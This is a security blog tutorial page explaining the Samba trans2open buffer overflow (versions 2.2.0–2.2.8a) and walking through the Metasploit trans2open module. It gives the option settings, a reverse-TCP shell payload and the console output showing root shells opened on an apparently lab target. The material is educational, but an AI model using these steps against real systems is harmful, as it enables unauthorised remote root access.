<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.108.0">
    <meta name="generator" content="Relearn 5.9.4+tip">
    <meta name="robots" content="noindex, nofollow, noarchive, noimageindex">
    <meta name="description" content="Exploit writeups, info sec articles..">
    <meta name="author" content="solc0nf">
    <title>Samba Trans2Open Exploit :: solc0nf</title>
    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
    <link href="/css/fontawesome-all.min.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/featherlight.min.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/featherlight.min.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/auto-complete.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar.min.css?1690804204" rel="stylesheet">
    <link href="/css/nucleus.css?1690804204" rel="stylesheet">
    <link href="/css/fonts.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/theme.css?1690804204" rel="stylesheet">
    <link href="/css/theme-relearn-dark.css?1690804204" rel="stylesheet" id="variant-style">
    <link href="/css/ie.css?1690804204" rel="stylesheet">
    <link href="/css/variant.css?1690804204" rel="stylesheet">
    <link href="/css/print.css?1690804204" rel="stylesheet" media="print">
    <script src="/js/url.js?1690804204"></script>
    <script src="/js/variant.js?1690804204"></script>
    <script>
      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
      window.index_js_url="/index.search.js";
      var root_url="/";
      var baseUri=root_url.replace(/\/$/, '');
      // translations
      window.T_Copy_to_clipboard = 'Copy to clipboard';
      window.T_Copied_to_clipboard = 'Copied to clipboard!';
      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
      // some further base stuff
      var baseUriFull='https:\/\/solc0nf.github.io/';
      window.variants && variants.init( [ 'relearn-dark' ] );
    </script>
    <script src="/js/jquery.min.js?1690804204" defer></script>
  </head>
  <body class="mobile-support html disableInlineCopyToClipboard" data-url="/exploit-articles/samba-trans2open-exploit/index.html">
    <div id="body" class="default-animation">
      <div id="sidebar-overlay"></div>
      <div id="toc-overlay"></div>
      <nav id="topbar" class="highlightable" dir="ltr">
        <div>
          <div class="navigation">
            <a class="nav nav-next" href="/exploit-articles/the-dirtycow-exploit/index.html" title="The Dirtycow Exploit (&#129106;)"><i class="fas fa-chevron-right fa-fw"></i></a>
          </div>
          <div class="navigation">
            <a class="nav nav-prev" href="/exploit-articles/shellshock/index.html" title="ShellShock (&#129104;)"><i class="fas fa-chevron-left fa-fw"></i></a>
          </div>
          <div id="top-print-link">
            <a class="print-link" title='Print whole chapter (CTRL+ALT+p)' href="/exploit-articles/samba-trans2open-exploit/index.print.html">
              <i class="fas fa-print fa-fw"></i>
            </a>
          </div>
          <div id="breadcrumbs">
            <span id="sidebar-toggle-span">
              <a href="#" id="sidebar-toggle" title='Menu (CTRL+ALT+n)'><i class="fas fa-bars fa-fw"></i></a>
            </span>
            <ol class="links" itemscope itemtype="http://schema.org/BreadcrumbList">
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/index.html"><span itemprop="name">solc0nf</span></a><meta itemprop="position" content="1"> > </li>
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/exploit-articles/index.html"><span itemprop="name">Exploit Articles</span></a><meta itemprop="position" content="2"> > </li>
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">Samba Trans2Open Exploit</span><meta itemprop="position" content="3"></li>
            </ol>
          </div>
        </div>
      </nav>
      <main id="body-inner" class="highlightable default" tabindex="-1">
        <div class="flex-block-wrapper">
          <div id="head-tags">
<div class="tags">
  <a class="tag-link" href="/tags/exploit/index.html">exploit</a>
  <a class="tag-link" href="/tags/linux/index.html">linux</a>
  <a class="tag-link" href="/tags/samba/index.html">samba</a>
</div>
          </div>
          <article class="default">
<h1 id="samba-trans2open-exploit">Samba Trans2Open Exploit</h1>

<p><strong>A little about Samba</strong>.</p>
<p>Samba is the standard Windows interoperabiity suite of programs for Linux and Unix. The Samba package provides secure, stable and fast file and print services for all clients such as OS/2, Linux, FreeBSD, using the SMB/CIFS protocol.</p>
<p>Samba is an important component to seamlessly integrate Linux servers and desktops into a Windows Active Directory environment. It can function both as a domain controller or as a regular domain member.</p>
<p>In Samba <em>versions 2.2.0 to 2.2.8a</em>, running on <em>x86 Linux systems</em> that do not have the <em>noexec stack option set</em>, there exists a buffer overflow vulnerability which could lead to remote administrative privilege compromise. This vulnerability could allow a remote attacker to execute arbitrary code on the affected system. The stack overflow error is believed to be in the trans2open() function call.</p>
<p>There are at least 3 variants of the trans2open exploit, one written in C and two written in the Perl scripting language.</p>
<p><strong>Samba trans2open Overflow (Linux x86) - Metasploit</strong></p>
<p>There are four metasploit exploit modules, as shown in the screenshot below:</p>
<p>
<a href="/images/metasploit_trans2open_modules.png" data-featherlight="image">
<img src="/images/metasploit_trans2open_modules.png" alt="Metasploit trans2_open" style="height: auto; width: auto;" loading="lazy">
</a></p>
<p>Basic usage:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msf6 &gt; use exploit/linux/samba/trans2open
</span></span><span style="display:flex;"><span>[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit(linux/samba/trans2open) &gt; options
</span></span><span style="display:flex;"><span>Module options (exploit/linux/samba/trans2open):
</span></span><span style="display:flex;"><span>   Name    Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----    ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
</span></span><span style="display:flex;"><span>                                      ing-metasploit.html
</span></span><span style="display:flex;"><span>   RPORT   139              yes       The target port (TCP)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Payload options (linux/x86/meterpreter/reverse_tcp):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
</span></span><span style="display:flex;"><span>   LPORT  4444             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploit target:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Id  Name
</span></span><span style="display:flex;"><span>   --  ----
</span></span><span style="display:flex;"><span>   0   Samba 2.2.x - Bruteforce
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
</span></span></code></pre></div><p>We need to set the following options before running the exploit</p>
<ul>
<li>RHOSTS → IP Address of the target Linux server</li>
<li>LHOST → IP Address of the attacker machine</li>
<li>Set the payload with <code>set payload linux/x86/shell_reverse_tcp</code></li>
</ul>
<p>Once both these options are set, execute the exploit by typing <strong>run</strong> or <strong>exploit</strong>.</p>
<p>Metasploit will run the exploit, and you will get root privileges on the target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Started reverse TCP handler on 192.168.56.11:4444 
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffdfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffcfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffbfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffafc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff9fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff8fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff7fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff6fc...
</span></span><span style="display:flex;"><span>[*] Command shell session 1 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32773) at 2022-05-24 19:34:58 +0400
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Command shell session 2 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32774) at 2022-05-24 19:34:59 +0400
</span></span><span style="display:flex;"><span>[*] Command shell session 3 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32775) at 2022-05-24 19:35:01 +0400
</span></span><span style="display:flex;"><span>[*] Command shell session 4 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32776) at 2022-05-24 19:35:02 +0400
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=99(nobody)
</span></span></code></pre></div><p><em>Reference Links:</em></p>
<p><em><a href="https://www.exploit-db.com/" target="_blank">exploit-db.com</a></em></p>
<p><em><a href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open" target="_blank">infosecmatter.com</a></em></p>
<p><em><a href="https://www.samba.org/" target="_blank">samba.org</a></em></p>
<p><em><a href="https://www.metasploit.com/" target="_blank">metasploit.com</a></em></p>

            <footer class="footline">
            </footer>
          </article>
        </div>
      </main>
    </div>
    <aside id="sidebar" class="default-animation showVisitedLinks" dir="ltr">
      <div id="header-wrapper" class="default-animation">
        <div id="header" class="default-animation">
<img src="/solconf.png"></img>
<h6>Solc0nf Systems</h6>
        </div>
        <form action="/search.html" method="get"><div class="searchbox default-animation">
          <button type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
          <label class="a11y-only" for="search-by">Search</label>
          <input data-search-input id="search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
          <span data-search-clear=""><i class="fas fa-times"></i></span>
        </div></form>
        <script>
          var contentLangs=['en'];
        </script>
        <script src="/js/auto-complete.js?1690804204" defer></script>
        <script src="/js/lunr/lunr.min.js?1690804204" defer></script>
        <script src="/js/lunr/lunr.stemmer.support.min.js?1690804204" defer></script>
        <script src="/js/lunr/lunr.multi.min.js?1690804204" defer></script>
        <script src="/js/lunr/lunr.en.min.js?1690804204" defer></script>
        <script src="/js/search.js?1690804204" defer></script>
      </div>
      <div id="homelinks" class="default-animation">
        <ul>
          <li><a class="padding" href="/index.html"><i class="fas fa-home"></i> Home</a></li>
        </ul>
      </div>
      <div id="content-wrapper" class="highlightable">
        <ul class="topics collapsible-menu">
          <li data-nav-id="/exploit-articles/index.html" class="dd-item parent"><input type="checkbox" id="section-3b4d423a3ed6a06d19aa7b4fd218b430" aria-controls="subsections-3b4d423a3ed6a06d19aa7b4fd218b430" class="toggle" checked><label class="a11y-only toggle" for="section-3b4d423a3ed6a06d19aa7b4fd218b430" >Submenu Exploit Articles</label><a href="/exploit-articles/index.html">Exploit Articles<i class="fas fa-check read-icon"></i></a><ul id="subsections-3b4d423a3ed6a06d19aa7b4fd218b430">
          <li data-nav-id="/exploit-articles/dirty-pipe/index.html" class="dd-item"><a href="/exploit-articles/dirty-pipe/index.html">Dirty Pipe<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/exploit-articles/shellshock/index.html" class="dd-item"><a href="/exploit-articles/shellshock/index.html">ShellShock<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/exploit-articles/samba-trans2open-exploit/index.html" class="dd-item active"><a href="/exploit-articles/samba-trans2open-exploit/index.html">Samba Trans2Open Exploit<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/exploit-articles/the-dirtycow-exploit/index.html" class="dd-item"><a href="/exploit-articles/the-dirtycow-exploit/index.html">The Dirtycow Exploit<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/exploit-articles/eternal-blue/index.html" class="dd-item"><a href="/exploit-articles/eternal-blue/index.html">Eternal Blue<i class="fas fa-check read-icon"></i></a></li></ul></li>
          <li data-nav-id="/linux-howto/index.html" class="dd-item"><input type="checkbox" id="section-2d4257959db23532f0d2a8f029bc3b96" aria-controls="subsections-2d4257959db23532f0d2a8f029bc3b96" class="toggle"><label class="a11y-only toggle" for="section-2d4257959db23532f0d2a8f029bc3b96" >Submenu Linux How To</label><a href="/linux-howto/index.html">Linux How To<i class="fas fa-check read-icon"></i></a><ul id="subsections-2d4257959db23532f0d2a8f029bc3b96">
          <li data-nav-id="/linux-howto/apache2-custom-site-with-self-signed-certificate/index.html" class="dd-item"><a href="/linux-howto/apache2-custom-site-with-self-signed-certificate/index.html">Apache2 Custom Site With Self Signed Certificate<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/linux-howto/encrypt-and-share-files-with-gpg/index.html" class="dd-item"><a href="/linux-howto/encrypt-and-share-files-with-gpg/index.html">Encrypt and Share Files With Gpg<i class="fas fa-check read-icon"></i></a></li>
          <li data-nav-id="/linux-howto/secure-passwords-in-linux/index.html" class="dd-item"><a href="/linux-howto/secure-passwords-in-linux/index.html">Secure Passwords in Linux<i class="fas fa-check read-icon"></i></a></li></ul></li>
        </ul>
        <div id="shortcuts">
          <div class="nav-title">More</div>
          <ul>
            <li><a class="padding" href="/tags/index.html"><i class='fas fa-tags'></i> Tags</a></li>
          </ul>
        </div>
        <div class="footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVisitedLinks showFooter"></div>
        <hr class="default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVisitedLinks showFooter">
        <div id="prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVisitedLinks">
          <ul>
            <li id="select-language-container" class="footerLangSwitch">
              <div class="padding select-container">
                <i class="fas fa-language fa-fw"></i>
                <span>&nbsp;</span>
                <div class="select-style">
                  <label class="a11y-only" for="select-language">Language</label>
                  <select id="select-language" onchange="location = baseUri + this.value;">
                  </select>
                </div>
                <div class="select-clear"></div>
              </div>
            </li>
            <li id="select-variant-container" class="footerVariantSwitch">
              <div class="padding select-container">
                <i class="fas fa-paint-brush fa-fw"></i>
                <span>&nbsp;</span>
                <div class="select-style">
                  <label class="a11y-only" for="select-variant">Theme</label>
                  <select id="select-variant" onchange="window.variants && variants.changeVariant( this.value );">
                    <option id="relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
                  </select>
                </div>
                <div class="select-clear"></div>
              </div>
              <script>window.variants && variants.markSelectedVariant();</script>
            </li>
            <li class="footerVisitedLinks showVisitedLinks"><button class="padding" onclick="clearHistory();"><i class="fas fa-history fa-fw"></i> Clear History</button></li>
          </ul>
        </div>
        <div id="footer" class="footerFooter showFooter">
	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
        </div>
      </div>
    </aside>
    <script src="/js/clipboard.min.js?1690804204" defer></script>
    <script src="/js/perfect-scrollbar.min.js?1690804204" defer></script>
    <script src="/js/featherlight.min.js?1690804204" defer></script>
    <script src="/js/theme.js?1690804204" defer></script>
  </body>
</html>
